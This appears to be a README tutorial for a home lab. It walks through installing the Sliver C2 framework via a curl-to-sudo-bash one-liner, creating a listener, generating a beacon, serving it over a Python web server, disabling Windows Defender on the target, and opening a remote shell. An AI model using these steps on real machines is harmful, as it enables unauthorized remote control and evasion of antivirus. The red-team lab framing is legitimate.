# How To Create a C2 Server Using Sliver


This tutorial will cover how to setup a [Sliver](https://github.com/BishopFox/sliver) host  (*Tested with Ubuntu 20.04 but should work with other distributions*)

## Linux One-Liner Installation
To get started, the simplest way is to utilize their 'one-liner' installation.

Simply go to any terminal with elevated permissions and run

`curl https://sliver.sh/install | sudo bash`

This should begin the installation process for whatever version of Linux you are using.

> **Note: The Sliver host *can* be a Windows machine, but Sliver themselves advise against it as some features will not work as expected**

Before you run the service, you may want to install `mingw-w64` to allow DLL payloads and shellcode to be deployed.

To run the service, simply type `sliver` into your terminal and it should start up. 

**Before you start the service, please take note of your IP address using either `ip address` or `hostname -I` if not already known**

## Listeners
The most basic feature that we will be utilizing first is a listener. To start a listener, open sliver and input `http -l <port>`. You can also just run `http` to open the default port of 80. However, I used port 8080 as this will be useful in future steps when running the file server.

If you attempt to open a port that is already running a listener, your output will look like this:

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/4bf1145e-1ad9-4a5b-8aef-5432707c1191)

Whereas open ports should look like this:

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/13167cbb-ec28-410d-be99-53834cf49d44)

For now, just open one listener at port 8080 and then continue on in this guide.

If you wish to see which listeners are running, type `jobs` into the terminal to see

## Beacons
The next step is to utilize this listener using a beacon. A beacon is a generated executable that once run on the machine to be infected (we'll get there soon), will allow you to run commands as said infected computer.

To create the beacon, you will run a command similar to the following:
`generate beacon -b <YOURLINUXIP>:8080`
![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/6fa50ec3-a52f-46a2-9417-b113cf6512c6)

This will create an executable which you will serve up to the machine that is to be 'infected' (for non-malicious purposes, of course)

## Serve Up Executable

The next step is somewhat up to personal preference and can be done in countless ways. The way I will be covering will be using python, but you can also use apache or any other http protocol file server of your choice. This step doesn't even need to necessarily be done using HTTP, as there are also DNS, TCP, and other methods of transferring this executable, but HTTP is the simplest, so that's the one we went with.

To start a webserver using python, first check that you have python installed on your machine (it does not need to be python3).

I would *highly recommend* hosting this server as a background process using & so that you can reopen sliver, although you could also run this server inside a container or on another page of your terminal if your machine supports that.

If you have python3, you can run this command: `python3 -m http.server &`. If you have a valid internet connection, you should get a response saying your machine is now hosting on 0.0.0.0:8000.

If you do not have python3, you can run this command: `python -m SimpleHTTPServer &`.

Both of these methods should result in the same outcome, with a simple http server hosting the files on your current directory.

## Client (To Be Infected)
Now that we have a file server on our Linux machine that is serving up the executable file, we can move on to our Windows Machine.
> Note the infected machine can also be a Linux machine, but it will not have some of the same features as a Windows client

### What if I have a Linux Client?
[Linux Instructions!](Linux_Instructions.md)

### Disable Anti-Virus Protections
Infecting the Windows Machine will first and foremost require some changes to Windows Defender. Sadly, due to the popularity of this tool, Windows Defender has wisened up and will recognize the signature, not allowing you to run the executable otherwise. Locate the Virus & threat protection settings using the search bar:

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/e5940d54-f229-4a8c-ac8d-5348e5e0735c)

Go to Virus & Threat protection settings:

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/9453cae9-69e5-45d8-99af-656e03381fd1)

And at the bare minimum, disable Automatic sample submission:

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/14c88c42-34e5-44f2-86c8-eee6e3af397e)

I went ahead and disabled all, as this is a virtual machine purely for the sake of testing and didn't want any impedence.

### Open Server on Any Internet Browser

Next, open any internet browser (I used Internet Explorer) and access the file server that was previously opened in the Serve Up Executable step.

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/771bde13-a11d-44ef-a6a8-3a0ad32f5875)

What you should then find is a very simple webpage with the files listed at the directory where the executable is.
(You should only see one executable, unless you generated multiple like me)

> If there is no page found, then you probably are experiencing the same issue I was, which is... networking.
> To fix this, I utilized Port Forwarding on Virtualbox between my two machines, and a inter-machine NAT Network that took a while to figure out. Networking with virtual machines can be a huge pain, so if you like a guide, I would look [here](https://www.youtube.com/watch?v=t4qqir33snI)

Otherwise, you should see something like this

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/9ff21807-a837-4f85-8273-8cd8c4db1620)

Next, click on the hyperlink to the executable and run:

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/5c3826c2-1326-4972-bd40-20b92a489d56)

Upon doing so, Sliver should hint that someone is falling for the trap!

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/e39daf73-fadf-4e85-bcc9-6ffe44c517f3)

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/58d94a92-6821-4ae1-9eb7-1d6441dabbdf)

Once the executable is done running, you are done with the client. You're in, that easy!

## The Door's Open, Now What?

Upon the executable finishing its execution, you should see this on your sliver host:

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/fa5ba95f-5ea8-4a51-8bf1-7d0fdfc31e32)

You can type `beacons` into your terminal to see the newly infected computer available to your host (i've done this a few times):

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/4e3b5b35-65b8-4e43-a720-34925cf075dd)

### Open a Session
Next, you will open up a session with your infected client.

Simply type `use`, tab to auto fill the session id, and press enter on the desired session:

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/53040da1-fe03-414f-8772-2c25fa2465f6)

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/ed2a4b69-a89a-4c70-84d1-5e4c26b3884a)

Now that the session is open, you have a myriad of options available to you. I will not cover all of them, except an important one, which is opening a powershell session on the infected client.

### Powershell / BASH Session
*These instructions are the same for both Windows and Linux*

To open a shell, you will need to create an `interactive` session.

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/659ad9b0-f5ec-4567-8ff7-a04b7b63343b)

To do so, first type `interactive` into your terminal.

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/b45c64a1-a837-4b21-b4a0-bfd8906b69c9)

Open that new session using use (In the image above, the first part of the id you want to find is referenced, in this case `10329df6 ...`):

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/b91232d9-de5f-44a0-a555-e25908095612)

This will open an 'interactive' session which will allow you to run a shell (you may need to wait for the command to run, because beacons use a periodic execution strategy to avoid detection).

To confirm if you are in the correct session, your terminal should be red if you are in an interactive session.

Now, simply type `shell` into your terminal, accept the disclaimer, and you can now run powershell / bash commands on your client as if you were the user!

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/bdbbf84b-ee17-4eb3-a44c-1ba6e713ea1f)

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/6da377ef-b521-4609-b08f-c8cb283d08b1)

This shell can now be used to run atomic tests, or whatever else you could think to do with this.

Happy coding!




